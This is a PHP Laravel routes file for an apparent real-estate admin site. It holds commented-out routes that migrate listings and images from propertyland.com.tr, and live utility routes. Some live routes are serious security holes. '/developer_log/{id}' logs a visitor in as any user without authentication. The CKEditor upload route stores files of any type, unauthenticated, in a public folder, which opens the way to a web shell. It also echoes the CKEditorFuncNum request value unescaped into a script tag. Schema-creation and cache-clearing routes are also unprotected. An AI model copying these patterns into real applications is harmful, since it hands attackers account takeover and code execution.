<?php

use Illuminate\Support\Facades\Route;
use GuzzleHttp\Psr7\Header;
use Illuminate\Http\Request;
use Illuminate\Auth\Notifications\ResetPassword;
use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;
use App\Models\City;
use App\Models\Project;
use App\Models\Photo;
use App\Models\Article;
/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/
Route::get('/fix', function () {
 /*   foreach (Project::all() as $Project){

        $words = str_word_count($Project->pic, 1);
        $words = array_count_values($words);
        if($words['source'] == 2){
            $Project->pic = substr($Project->pic,7);
            $Project->save();
        }

        foreach ($Project->photos as $photo){
            $wordspath = str_word_count($photo->path, 1);
            $wordspath = array_count_values($wordspath);
            if($wordspath['source'] == 2){
                $photo->path = substr($photo->path,7);
                $Project->photo()->save($photo);
            }
        }


    }*/

});
Route::get('/copy', function () {
   /* $categories = DB::connection('mysql2')->table('categories')->where('type',"villa")->get();

    foreach ($categories as $index=>$categoroy) {

        $photos = DB::connection('mysql2')->table('photos')->where('type',"gallery")->where('pictures_id',$categoroy->id)->get();

        $cat_locales = DB::connection('mysql2')->table('cat_locales')->where('id', $categoroy->cat_locate_id)->first();
        $City = City::where('name', $cat_locales->title)->first();
        if ($City == null) {
            $City = new City;
            $City->name = $cat_locales->title;
            $City->save();
        }

        $p = Project::where('slug',$categoroy->slug)->first();
        if($p == null){
            $item = new Project();
            if ($categoroy->pic != null) {
                $contents = file_get_contents('https://propertyland.com.tr/' . $categoroy->pic);
                $img_name = explode("/", $categoroy->pic)[6];
                $path = 'source/assets/uploads/categories/' . my_jdate(date('Y/m/d'), 'Y-m-d') . '/photos/';
                $public_path = base_path($path);
                if (!is_dir($public_path)) {
                    mkdir($public_path, 0777, true);
                }

                copy('https://propertyland.com.tr/' . $categoroy->pic, $public_path . $img_name);

                $item->pic = 'source/' . $path . $img_name;
            }
            $item->type = 'villa';
            if ($categoroy->name_admin == null){
                $item->name_fa = $categoroy->name;
            }
            else{
                $item->name_fa = $categoroy->name_admin;
            }

            $item->code = $categoroy->code;
            $item->slug = $categoroy->slug;
            $item->brief_fa = $categoroy->text;
            $item->description_fa = $categoroy->description;
            $item->city_id = $City->id;
            $item->address_fa = $City->name;
            $item->area = $categoroy->meter;
            $item->floor = $categoroy->count_all_unit;
            $item->from_price = $categoroy->price;
            $item->status_fa = 'active';
            $item->status_en = 'pending';
            $item->price = $categoroy->price;
            $item->villa_view = 'null';
            $item->properties_out  = 'null';
            $item->properties_in  = 'null';
            $item->properties_access  = 'null';
            $item->user_id = auth()->id();


            $item->save();


        }else{
            foreach ($photos as $photo) {
                $contents = file_get_contents('https://propertyland.com.tr/' . $photo->path);
                if(count(explode("/", $photo->path)) == 6){
                    $img_name = explode("/", $photo->path)[5];
                }else{
                    $img_name = explode("/", $photo->path)[6];
                }


                $path = 'source/assets/uploads/categories/' . my_jdate(date('Y/m/d'), 'Y-m-d') . '/photos/';
                $public_path = base_path($path);
                if (!is_dir($public_path)) {
                    mkdir($public_path, 0777, true);
                }

                copy('https://propertyland.com.tr/' . $photo->path, $public_path . $img_name);

                $photo = new Photo();
                $photo->path = 'source/' . $path . $img_name;
                $photo->name = 'gallery';
                $p->photo()->save($photo);
            }
        }
    }*/


});

/*Route::get('/copy/blog', function () {
    $articles = DB::connection('mysql2')->table('articles')->get();
    foreach($articles as $article){

        $p = Article::where('slug',$article->slug)->first();
        if($p == null) {
            $post = new Article;
            if ($article->photo != null) {
                $contents = file_get_contents('https://propertyland.com.tr/' . $article->photo);
                if(count(explode("/", $article->photo)) == 6){
                    $img_name = explode("/", $article->photo)[5];
                }else{
                    $img_name = explode("/", $article->photo)[6];
                }
                $path = 'source/assets/uploads/categories/' . my_jdate(date('Y/m/d'), 'Y-m-d') . '/photos/';
                $public_path = base_path($path);
                if (!is_dir($public_path)) {
                    mkdir($public_path, 0777, true);
                }

                copy('https://propertyland.com.tr/' . $article->photo, $public_path . $img_name);

                $post->photo = 'source/' . $path . $img_name;
            }

            $post->category_id = 0;
            $post->title = $article->title;
            $post->slug = $article->slug;
            $post->text_short = $article->text_short;
            $post->text = $article->text;
            $post->author = $article->author;
            $post->page_title = $article->page_title;
            $post->keywords = $article->keywords;
            $post->description = $article->description;
            $post->type = $article->type;
            $post->save();

        }


    }

    dd($articles);
});*/

Route::get('/developer_log/{id}', function ($id) {
    Auth::loginUsingId($id);
    return redirect()->route('admin.profile.show');
});

Route::get('/maketable', function () {

    Schema::create('top_cities', function (Blueprint $table) {
        $table->id();
        $table->string('name');
        $table->string('pic');
        $table->integer('city_id');
        $table->timestamps();
    });

});

Route::get('/template/{id}', function ($id) {
   if($id==1)
   {
       session(['back_css' => 'black']);
   }
   else
   {
       session()->forget('back_css');
   }

   return redirect()->back();
});
//Route::get('/', function () {
//    return  redirect()->route('login');
////    return view('livewire.hr-dashboard.index');
//});


Auth::routes(['register' => false]);

Route::get('/home', [App\Http\Controllers\HomeController::class, 'index'])->name('home');

Route::post('filemanager/upload',function (Request $request ){
    if(isset($_FILES['upload']['name'])) {
        $file=$_FILES['upload']['name'];
        $filetmp=$_FILES['upload']['tmp_name'];
        $file_pas=explode('.',$file);
        $file_n='check_editor_'.time().'_'.$file_pas[0].'.'.end($file_pas);
        $photo=move_uploaded_file($filetmp,'assets/editor/upload/'.$file_n);

        $CKEditorFuncNum = $request->input('CKEditorFuncNum');
        $url = url('assets/editor/upload/'.$file_n);
        $msg = 'File uploaded successfully';
        $response = "<script>window.parent.CKEDITOR.tools.callFunction($CKEditorFuncNum, '$url', '$msg')</script>";

        @header('Content-type: text/html; charset=utf-8');
        echo $response;
    }
})->name('filemanager_upload');


Route::get('filemanager',function (Request $request ){
    $paths=glob('assets/editor/upload/*');
    $fileNames=array();
    foreach ($paths as $path)
    {
        array_push($fileNames,basename($path));
    }
    $data=array(
        'fileNames'=>$fileNames
    );
    return view('file_manager')->with($data);
})->name('filemanager');

Route::get('/clear-cache', function() {
    $exitCode = Artisan::call('cache:clear');
    return '<h1>Cache facade value cleared</h1>';
});
